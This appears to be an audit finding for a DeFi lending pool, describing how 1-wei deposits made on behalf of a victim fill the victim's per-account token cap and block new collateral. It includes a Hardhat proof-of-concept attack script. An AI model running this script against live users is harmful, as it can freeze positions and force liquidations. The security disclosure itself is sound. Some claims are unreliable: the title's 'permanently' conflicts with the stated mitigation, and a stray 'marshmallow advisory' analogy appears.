### Title
Attacker can permanently fill a victim's per-account token list with dust, blocking all new collateral deposits/debt positions via `UserReachedMaxTokens` reverts - ([File: contracts/Pool.sol])

### Summary
The bug class in the marshmallow advisory is asymmetric resource consumption: a small attacker-controlled input forces the victim into disproportionate work and eventual failure. The on-chain analog in Metronome is the per-account token registry: `Pool` tracks every `DepositToken`/`DebtToken` an account has ever held in `MappedEnumerableSet.AddressSet` and hard-caps it at `MAX_TOKENS_PER_USER = 30`. Because `DepositToken._transfer` and `_mint` unconditionally add the recipient to the set (and revert the whole transaction if the cap is reached), an attacker can cheaply spam a victim's set to the cap with dust deposits made `onBehalfOf_ = victim`, after which every attempt by the victim to receive a new deposit token, deposit a new collateral type, or take on a new debt position reverts.

### Finding Description
`Pool` enforces a combined cap on tokens tracked per account:

```solidity
// contracts/Pool.sol
uint256 public constant MAX_TOKENS_PER_USER = 30;

modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
    if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
        revert UserReachedMaxTokens();
    }
    _;
}
``` [1](#0-0) 

Both registration entry points are guarded by it: [2](#0-1) [3](#0-2) 

The critical enabler is `DepositToken.deposit(amount_, onBehalfOf_)`, which mints the deposit-token position to an arbitrary `onBehalfOf_` address chosen by the caller, with no opt-in from the recipient: [4](#0-3) 

`_mint` adds the recipient to the per-account list on first receipt, and `_transfer` does the same for recipients of transfers: [5](#0-4) [6](#0-5) 

`depositOf`/`debtOf` then iterate this set for every health check, liquidation, withdraw lock check (`unlockedBalanceOf` calls `debtPositionOf`), etc.: [7](#0-6) [8](#0-7) 

Attack path (public entry points only, unprivileged EOA):
1. Attacker calls `DepositToken.deposit(1 wei, victim)` once per listed deposit token. `maxTotalSupply` permitting, this costs the attacker ~30 dust deposits and fills `depositTokensOfAccount[victim]` to `MAX_TOKENS_PER_USER` (the count also includes any `debtTokensOfAccount` entries, so even fewer may suffice for active borrowers).
2. From then on, any call that would add a *new* token to the victim's set reverts inside `onlyIfAdditionWillNotReachMaxTokens`:
   - `deposit(newCollateral, victim)` by anyone → revert in `_mint` → `addToDepositTokensOfAccount`.
   - `depositToken.transfer(victim, ...)` / `seize(victim)` → revert in `_transfer`.
   - `DebtToken.issue`/mint of a synthetic the victim doesn't yet hold → revert via `addToDebtTokensOfAccount` (same modifier, `contracts/Pool.sol:204`).

The victim cannot remove these dust entries without knowing about them: removal only happens when a balance goes exactly to zero, and the dust sits in the victim's balance until the victim manually transfers each dust position away (a remediation most frontends won't surface). The liveness invariant — a healthy user must be able to add collateral to avoid liquidation or rotate collateral types — is broken.

### Impact Explanation
- Forced liquidation / loss of funds: a borrower close to the liquidation threshold cannot deposit a *new* collateral type to restore health, and cannot receive seized back or donated collateral. Their only defense is withdrawing/repaying with existing assets — which may be impossible if their position requires additional collateral. This converts a cheap griefing transaction into real liquidation losses.
- Temporary/permanent freezing of positions: all new deposits and inbound transfers of any deposit token the victim doesn't already hold revert, indefinitely, until the victim discovers and manually clears 30 dust balances. During that window the account is effectively frozen with respect to new collateral.
- Amplification via `Operator.execute`: batched user flows (deposit + mint in one `execute`) revert atomically, so even rescue transactions built through the Operator fail.

### Likelihood Explanation
- Cost: ~30 minimal `deposit` calls (dust `amount_`), plus gas; no capital lockup beyond dust. `deposit` has `amount_ == 0` rejected but accepts 1 wei.
- No privileged role, oracle manipulation, or timing requirement; works on deployed configuration since `MAX_TOKENS_PER_USER` is a hardcoded constant and `addDepositToken` already allows up to 30 deposit tokens (`Pool.sol:703`).
- Caveat: requires the pool to list enough deposit tokens (cap is shared with debt tokens, so borrowers need fewer dust deposits), and the victim retains partial mitigation (transfer dust out), which is why severity is Medium rather than High — matching the source advisory's Medium rating.

### Recommendation
- Make addition to `depositTokensOfAccount`/`debtTokensOfAccount` opt-in for the recipient, or exempt the cap check for the *transfer* path so inbound transfers can't be blocked (only `deposit`/issuance).
- Alternatively, reject `deposit` on behalf of another account when it would grow that account's set (i.e., only allow `onBehalfOf_` adds when the caller is the beneficiary), or require a minimum non-dust deposit amount to register a token.
- Document/off-chain remediation: provide a `sweep`/batch transfer helper so affected users can zero dust entries in one transaction.

### Proof of Concept
Foundry/Hardhat fork sketch (Hardhat, mainnet fork):

```ts
// Fork mainnet; attacker is a fresh EOA; victim holds an msUSD debt position.
const pool = await ethers.getContractAt('Pool', POOL_PROXY)
const depositTokens: string[] = await pool.getDepositTokens() // governor-listed msd tokens

// 1. Fill victim's set to MAX_TOKENS_PER_USER (30) with 1-wei deposits.
for (const addr of depositTokens) {
  const dt = await ethers.getContractAt('DepositToken', addr)
  const underlying = await ethers.getContractAt('IERC20', await dt.underlying())
  // attacker acquires a few wei of each underlying (swap/whale), approves, then:
  await underlying.connect(attacker).approve(addr, 1)
  await dt.connect(attacker).deposit(1, victim.address) // onBehalfOf_ = victim
}

expect(await pool.getDepositTokensOfAccount(victim.address)).to.have.length(30)

// 2. Any new collateral deposit for victim now reverts.
const newDt = await ethers.getContractAt('DepositToken', someNewDepositToken)
await expect(
  newDt.connect(victim).deposit(parseUnits('100', 6), victim.address)
).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens')

// 3. Inbound transfer of any new deposit token also reverts.
await expect(
  newDt.connect(attacker).transfer(victim.address, 1)
).to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens')

// 4. If victim was near liquidation, they cannot add collateral; a liquidator
//    can then call pool.liquidate(...) and seize collateral at a discount.
```

Note: steps 1–3 are reproducible purely against deployed state; step 4 requires the victim to be unhealthy or near the floor, which the attacker can wait for or help induce with the same dust (dust collateral positions can marginally change `depositOf` results).

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-208)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }
```

**File:** contracts/Pool.sol (L216-220)
```text
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/Pool.sol (L274-288)
```text
    function depositOf(
        address account_
    ) public view override returns (uint256 _depositInUsd, uint256 _issuableLimitInUsd) {
        IMasterOracle _masterOracle = masterOracle();
        uint256 _length = depositTokensOfAccount.length(account_);
        for (uint256 i; i < _length; ++i) {
            IDepositToken _depositToken = IDepositToken(depositTokensOfAccount.at(account_, i));
            uint256 _amountInUsd = _masterOracle.quoteTokenToUsd(
                address(_depositToken.underlying()),
                _depositToken.balanceOf(account_)
            );
            _depositInUsd += _amountInUsd;
            _issuableLimitInUsd += _amountInUsd.wadMul(_depositToken.collateralFactor());
        }
    }
```

**File:** contracts/DepositToken.sol (L211-236)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
```

**File:** contracts/DepositToken.sol (L383-398)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
    }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-525)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }

        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```
